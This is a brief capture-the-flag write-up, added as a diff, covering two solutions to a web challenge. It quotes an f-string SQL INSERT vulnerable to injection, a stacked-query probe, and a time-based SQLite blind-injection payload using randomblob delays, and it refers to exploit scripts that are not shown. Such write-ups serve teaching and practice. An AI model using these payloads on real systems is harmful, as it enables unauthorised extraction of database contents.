@@ -1,0 +1,31 @@
+============== Solution 1: Error-Based ==============
+
+Integer Overflow, find flag character bit by bit
+
+python3 exp2.py
+
+============== Solution 2: Time-Based ==============
+
+main.py
+```
+sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
+```
+
+Err: INSERT INTO `user`(password, username) VALUES ('ssss', 'a')
+UNIQUE constraint failed: user.username
+
+
+a');select 1-- -
+```
+Err: INSERT INTO `user`(password, username) VALUES ('asd', 'a');select 1-- -')
+You can only execute one statement at a time.
+```
+
+SQLite
+
+Time-Based
+```
+') UNION SELECT 1, CASE WHEN length(min(tbl_name))>0 THEN randomblob(300000000) END FROM sqlite_master;-- -
+```
+
+python3 exp.py
